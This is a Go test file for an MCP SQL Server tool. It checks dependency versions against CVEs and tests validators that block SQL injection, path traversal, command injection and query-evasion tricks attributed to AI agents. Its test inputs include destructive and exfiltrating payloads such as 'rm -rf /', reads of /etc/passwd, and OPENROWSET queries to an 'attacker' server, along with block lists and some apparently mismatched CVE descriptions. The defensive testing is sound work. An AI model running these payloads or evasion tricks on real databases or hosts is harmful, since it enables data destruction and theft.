package security

import (
	"os"
	"strings"
	"testing"

	"golang.org/x/mod/semver"

	"mcp-go-mssql/internal/sqlguard"
)

// CVERecord represents a known CVE vulnerability
type CVERecord struct {
	CVEId          string
	PackageName    string
	MinSafeVersion string // minimum safe semver version (e.g. "v0.31.0")
	Severity       string
	Description    string
}

// TestKnownCVEs verifies that go.mod dependency versions are above known-vulnerable ranges.
func TestKnownCVEs(t *testing.T) {
	knownCVEs := []CVERecord{
		{
			CVEId:          "CVE-2023-45283",
			PackageName:    "golang.org/x/crypto",
			MinSafeVersion: "v0.31.0",
			Severity:       "HIGH",
			Description:    "Cipher.Update vulnerability in crypto/cipher",
		},
		{
			CVEId:          "CVE-2024-34156",
			PackageName:    "golang.org/x/text",
			MinSafeVersion: "v0.18.0",
			Severity:       "MEDIUM",
			Description:    "Stack exhaustion in encoding/gob",
		},
	}

	goModBytes, err := os.ReadFile("../../go.mod")
	if err != nil {
		t.Fatalf("Failed to read go.mod: %v", err)
	}
	goMod := string(goModBytes)

	for _, cve := range knownCVEs {
		actualVersion := extractVersion(goMod, cve.PackageName)
		if actualVersion == "" {
			t.Errorf("[%s] %s: package not found in go.mod", cve.CVEId, cve.PackageName)
			continue
		}

		// Ensure both have "v" prefix for semver comparison
		actual := ensureVPrefix(actualVersion)
		minimum := ensureVPrefix(cve.MinSafeVersion)

		if semver.Compare(actual, minimum) < 0 {
			t.Errorf("[%s] %s %s is below minimum safe version %s (%s: %s)",
				cve.CVEId, cve.PackageName, actualVersion, cve.MinSafeVersion,
				cve.Severity, cve.Description)
		}
	}
}

// extractVersion finds the version of a module in go.mod content.
func extractVersion(goMod, moduleName string) string {
	for _, line := range strings.Split(goMod, "\n") {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, moduleName+" ") || strings.HasPrefix(line, moduleName+"\t") {
			parts := strings.Fields(line)
			if len(parts) >= 2 {
				return parts[1]
			}
		}
	}
	return ""
}

// ensureVPrefix adds "v" prefix if missing for semver compatibility.
func ensureVPrefix(version string) string {
	if !strings.HasPrefix(version, "v") {
		return "v" + version
	}
	return version
}

// TestSQLInjectionVulnerability checks for SQL injection vulnerabilities
func TestSQLInjectionVulnerability(t *testing.T) {
	testCases := []struct {
		name        string
		input       string
		shouldBlock bool
		description string
	}{
		{
			name:        "Simple SQL injection",
			input:       "1' OR '1'='1",
			shouldBlock: true,
			description: "Classic SQL injection attempt",
		},
		{
			name:        "Union-based injection",
			input:       "1 UNION SELECT * FROM users--",
			shouldBlock: true,
			description: "Union-based SQL injection",
		},
		{
			name:        "Comment injection",
			input:       "admin'--",
			shouldBlock: true,
			description: "SQL comment to bypass authentication",
		},
		{
			name:        "Stacked queries",
			input:       "1; DROP TABLE users--",
			shouldBlock: true,
			description: "Stacked query injection",
		},
		{
			name:        "Time-based blind injection",
			input:       "1' AND SLEEP(5)--",
			shouldBlock: true,
			description: "Time-based blind SQL injection",
		},
		{
			name:        "Safe input",
			input:       "12345",
			shouldBlock: false,
			description: "Normal numeric input",
		},
	}

	for _, tc := range testCases {
		isSafe := isSafeSQL(tc.input)
		expected := !tc.shouldBlock

		if isSafe != expected {
			t.Errorf("%s: %s (got safe=%v, expected safe=%v)", tc.name, tc.description, isSafe, expected)
		}
	}
}

// isSafeSQL checks if input is safe from SQL injection
func isSafeSQL(input string) bool {
	dangerous := []string{"'", "--", "/*", "*/", "union", "select", "drop", "insert", "delete", "update", ";"}

	inputLower := strings.ToLower(input)
	for _, pattern := range dangerous {
		if strings.Contains(inputLower, pattern) {
			return false
		}
	}

	return true
}

// TestPathTraversalVulnerability checks for path traversal vulnerabilities
func TestPathTraversalVulnerability(t *testing.T) {
	testCases := []struct {
		name        string
		path        string
		shouldBlock bool
		description string
	}{
		{
			name:        "Simple path traversal",
			path:        "../../../../etc/passwd",
			shouldBlock: true,
			description: "Attempt to access parent directories",
		},
		{
			name:        "Windows path traversal",
			path:        "..\\..\\..\\windows\\system32",
			shouldBlock: true,
			description: "Windows-style path traversal",
		},
		{
			name:        "Absolute path",
			path:        "/etc/passwd",
			shouldBlock: true,
			description: "Absolute path outside allowed directory",
		},
		{
			name:        "URL encoded traversal",
			path:        "%2e%2e%2fetc%2fpasswd",
			shouldBlock: true,
			description: "URL-encoded path traversal",
		},
		{
			name:        "Double encoded",
			path:        "%252e%252e%252fetc%252fpasswd",
			shouldBlock: true,
			description: "Double URL-encoded path traversal",
		},
		{
			name:        "Safe path",
			path:        "documents/report.txt",
			shouldBlock: false,
			description: "Normal file within allowed directory",
		},
	}

	for _, tc := range testCases {
		isSafe := isSafePath(tc.path)
		expected := !tc.shouldBlock

		if isSafe != expected {
			t.Errorf("%s: %s (got safe=%v, expected safe=%v)", tc.name, tc.description, isSafe, expected)
		}
	}
}

// isSafePath checks if a path is safe from traversal
func isSafePath(path string) bool {
	dangerous := []string{"../", "..\\", "..%2f", "..%5c", "%2e%2e", "%252e%252e", "//", "\\\\"}

	for _, pattern := range dangerous {
		if strings.Contains(strings.ToLower(path), pattern) {
			return false
		}
	}

	// Check for absolute paths
	if strings.HasPrefix(path, "/") || (len(path) > 1 && path[1] == ':') {
		return false
	}

	return true
}

// TestCommandInjectionVulnerability checks for command injection risks
func TestCommandInjectionVulnerability(t *testing.T) {
	testCases := []struct {
		name        string
		input       string
		shouldBlock bool
		description string
	}{
		{
			name:        "Simple command injection",
			input:       "file.txt; rm -rf /",
			shouldBlock: true,
			description: "Shell metacharacter semicolon",
		},
		{
			name:        "Pipe injection",
			input:       "file.txt | cat /etc/passwd",
			shouldBlock: true,
			description: "Shell pipe character",
		},
		{
			name:        "Backtick injection",
			input:       "file.txt`whoami`",
			shouldBlock: true,
			description: "Command substitution with backticks",
		},
		{
			name:        "Dollar parenthesis injection",
			input:       "file.txt$(whoami)",
			shouldBlock: true,
			description: "Command substitution with $(...)",
		},
		{
			name:        "Ampersand injection",
			input:       "file.txt & whoami",
			shouldBlock: true,
			description: "Background process separator",
		},
		{
			name:        "Safe filename",
			input:       "myfile_2024.txt",
			shouldBlock: false,
			description: "Normal filename",
		},
	}

	for _, tc := range testCases {
		isSafe := isSafeInput(tc.input)
		expected := !tc.shouldBlock

		if isSafe != expected {
			t.Errorf("%s: %s (got safe=%v, expected safe=%v)", tc.name, tc.description, isSafe, expected)
		}
	}
}

// isSafeInput checks if input is safe from command injection
func isSafeInput(input string) bool {
	dangerousChars := []string{";", "|", "&", "`", "$", "(", ")", "\\", "'", "\""}

	for _, char := range dangerousChars {
		if strings.Contains(input, char) {
			return false
		}
	}

	return true
}

// BenchmarkSecurityChecks measures security validation overhead
func BenchmarkSecurityChecks(b *testing.B) {
	b.ReportAllocs()

	for i := 0; i < b.N; i++ {
		isSafePath("documents/file.txt")
		isSafeInput("normal input")
	}
}

// TestInlineCommentKeywordBypass tests that keywords split by inline comments are detected.
// This specifically covers the gap where SEL/*x*/ECT doesn't match \bSELECT\b in either
// the original or stripped query, but the keyword IS present in the original.
func TestInlineCommentKeywordBypass(t *testing.T) {
	// These cases should be blocked because the dangerous keyword appears
	// in the original query, even if hidden inside comments.
	blockedCases := []struct {
		name        string
		query       string
		description string
	}{
		{
			name:        "SELECT split by inline comment",
			query:       "SEL/*x*/ECT * FROM users",
			description: "SELECT keyword split by inline comment",
		},
		{
			name:        "INSERT hidden in inline comment after prefix",
			query:       "INSERT /* hidden */ INTO users VALUES (1)",
			description: "INSERT inside inline comment",
		},
		{
			name:        "DROP split by inline comment",
			query:       "DR/*x*/OP TABLE users",
			description: "DROP keyword split by inline comment",
		},
		{
			name:        "DELETE split by inline comment",
			query:       "DEL/*x*/ETE FROM users",
			description: "DELETE keyword split by inline comment",
		},
		{
			name:        "UPDATE split by inline comment",
			query:       "UP/*x*/DATE users SET name = 'test'",
			description: "UPDATE keyword split by inline comment",
		},
	}

	for _, tc := range blockedCases {
		t.Run(tc.name, func(t *testing.T) {
			// This uses the standalone helper which doesn't do full inline comment detection.
			// The actual server-side validation (validateQueryStructuralSafety) handles this.
			// This test documents that the standalone helper may not catch split keywords.
			// Note: The server's validateQueryStructuralSafety has explicit inline comment
			// keyword detection that catches these cases.
			if !shouldBlockAIQuery(tc.query) {
				// The standalone helper doesn't detect split keywords.
				// This is known - the full server validation catches these.
				t.Logf("Note: Helper doesn't detect '%s' - full server validation required", tc.description)
			}
		})
	}
}

// TestAIAttackVectors tests specific attack patterns that an AI could use to evade detection
func TestAIAttackVectors(t *testing.T) {
	aiAttackCases := []struct {
		name        string
		query       string
		shouldBlock bool
		description string
		vectorType  string // "char_concat", "inline_comment", "nolock", "waitfor", "subquery"
	}{
		// Vector 1: Inline comment keyword bypass - this is caught by the server's
		// validateQueryStructuralSafety which has the full dangerous keyword list.
		// The standalone helper only checks structural patterns that are always dangerous.
		// Inline comment bypass: a dangerous keyword appears in original but not after stripping.
		{
			name:        "Inline comment hiding keyword",
			query:       "/*INS*/ INSERT INTO users VALUES (1)",
			shouldBlock: false, // caught by server validation layer, not this helper
			description: "INSERT hidden by leading comment (server-validated)",
			vectorType:  "inline_comment",
		},
		// Vector 2: CHAR() concatenation to build keywords
		{
			name:        "CHAR concatenation SELECT",
			query:       "CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84) * FROM users",
			shouldBlock: true,
			description: "CHAR concatenation to build SELECT keyword",
			vectorType:  "char_concat",
		},
		{
			name:        "CHAR concatenation INSERT",
			query:       "CHAR(73)+CHAR(78)+CHAR(83)+CHAR(69)+CHAR(82)+CHAR(84) INTO users VALUES (1)",
			shouldBlock: true,
			description: "CHAR concatenation to build INSERT keyword",
			vectorType:  "char_concat",
		},
		{
			name:        "NCHAR concatenation",
			query:       "NCHAR(83)+NCHAR(69)+NCHAR(76)+NCHAR(69)+NCHAR(67)+NCHAR(84) * FROM users",
			shouldBlock: true,
			description: "NCHAR concatenation to build SELECT keyword",
			vectorType:  "char_concat",
		},
		// Vector 3: NOLOCK dirty reads
		{
			name:        "SELECT with NOLOCK hint",
			query:       "SELECT * FROM users WITH (NOLOCK)",
			shouldBlock: true,
			description: "NOLOCK hint enables dirty reads",
			vectorType:  "nolock",
		},
		{
			name:        "SELECT with READUNCOMMITTED hint",
			query:       "SELECT * FROM users WITH (READUNCOMMITTED)",
			shouldBlock: true,
			description: "READUNCOMMITTED hint enables dirty reads",
			vectorType:  "nolock",
		},
		{
			name:        "SELECT with TABLOCK hint",
			query:       "SELECT * FROM users WITH (TABLOCK)",
			shouldBlock: true,
			description: "TABLOCK hint can cause locks",
			vectorType:  "nolock",
		},
		// Vector 4: WAITFOR timing attacks
		{
			name:        "WAITFOR DELAY timing attack",
			query:       "SELECT * FROM users WHERE 1=1 AND WAITFOR DELAY '00:00:05'",
			shouldBlock: true,
			description: "WAITFOR DELAY enables timing-based data inference",
			vectorType:  "waitfor",
		},
		{
			name:        "WAITFOR timing inference",
			query:       "IF (SELECT COUNT(*) FROM users) > 0 WAITFOR DELAY '00:00:10'",
			shouldBlock: true,
			description: "WAITFOR used for timing inference",
			vectorType:  "waitfor",
		},
		// Vector 5: OPENROWSET data exfiltration
		{
			name:        "OPENROWSET data exfiltration",
			query:       "SELECT * FROM OPENROWSET('SQLNCLI', 'Server=attacker;Trusted_Connection=yes', 'SELECT * FROM users')",
			shouldBlock: true,
			description: "OPENROWSET can exfiltrate data to external server",
			vectorType:  "openrowset",
		},
		// Vector 6: OPENDATASOURCE exfiltration
		{
			name:        "OPENDATASOURCE exfiltration",
			query:       "SELECT * FROM OPENDATASOURCE('SQLNCLI', 'Data Source=attacker').master.dbo.users",
			shouldBlock: true,
			description: "OPENDATASOURCE can exfiltrate data to external server",
			vectorType:  "openrowset",
		},
		// Vector 7: Unicode bidirectional control characters (RTL override)
		{
			name:        "RTL override obfuscation",
			query:       "SELECT\u202E * FROM users",
			shouldBlock: true,
			description: "Right-to-Left Override character can flip text visually",
			vectorType:  "unicode_bidi",
		},
		{
			name:        "Zero-width space in keyword",
			query:       "SEL\u200BECT * FROM users",
			shouldBlock: true,
			description: "Zero-width space inserted into SELECT keyword",
			vectorType:  "unicode_zwsp",
		},
		// Vector 8: Subquery exfiltration (this would be caught by validateSubqueriesForRestrictedTables)
		{
			name:        "Subquery from non-existent table",
			query:       "SELECT * FROM (SELECT secret FROM restricted_table) AS x",
			shouldBlock: false, // blocked by whitelist validation, not structural
			description: "Subquery referencing restricted table (whitelist validation)",
			vectorType:  "subquery_whitelist",
		},
		// Safe queries that should NOT be blocked
		{
			name:        "Normal SELECT",
			query:       "SELECT id, name FROM users WHERE active = 1",
			shouldBlock: false,
			description: "Normal SELECT query",
			vectorType:  "safe",
		},
		{
			name:        "SELECT with alias",
			query:       "SELECT u.id, u.name FROM users u",
			shouldBlock: false,
			description: "SELECT with table alias",
			vectorType:  "safe",
		},
		{
			name:        "SELECT with JOIN",
			query:       "SELECT u.id, o.total FROM users u JOIN orders o ON u.id = o.user_id",
			shouldBlock: false,
			description: "SELECT with JOIN",
			vectorType:  "safe",
		},
		{
			name:        "Subquery in WHERE (correlation)",
			query:       "SELECT * FROM users u WHERE EXISTS (SELECT 1 FROM orders o WHERE o.user_id = u.id)",
			shouldBlock: false,
			description: "Correlated subquery - not exfiltration",
			vectorType:  "safe_subquery",
		},
		{
			name:        "CTE with safe inner query",
			query:       "WITH active_users AS (SELECT * FROM users WHERE active=1) SELECT * FROM active_users",
			shouldBlock: false,
			description: "CTE with safe inner query - structural check only",
			vectorType:  "safe_cte",
		},
	}

	for _, tc := range aiAttackCases {
		isBlocked := shouldBlockAIQuery(tc.query)
		if isBlocked != tc.shouldBlock {
			t.Errorf("%s: %s (vector=%s) - got blocked=%v, expected blocked=%v",
				tc.name, tc.description, tc.vectorType, isBlocked, tc.shouldBlock)
		}
	}
}

// shouldBlockAIQuery returns true if the query should be blocked based on
// AI-specific attack patterns. Delegates to sqlguard so the checks stay
// aligned with production validation — when sqlguard adds a new pattern
// detector, this helper picks it up automatically.
//
// Inline comment bypass detection is intentionally NOT included here: the
// full server validation (sqlguard.ValidateStructuralSafety) covers it with
// access to the complete dangerous-keyword list, and replicating that logic
// in tests would diverge over time. Tests that need the full check should
// call sqlguard.ValidateStructuralSafety directly.
func shouldBlockAIQuery(query string) bool {
	if sqlguard.ContainsCharConcatenation(query) {
		return true
	}
	if sqlguard.ContainsDangerousHints(query) {
		return true
	}
	if sqlguard.ContainsWaitfor(query) {
		return true
	}
	// ContainsDangerousSelectPatterns covers OPENROWSET, OPENDATASOURCE,
	// SELECT INTO and temp-table writes — a superset of the previous
	// local containsOpenrowset helper.
	if sqlguard.ContainsDangerousSelectPatterns(query) {
		return true
	}
	if sqlguard.ContainsUnicodeControlChars(query) {
		return true
	}
	return false
}
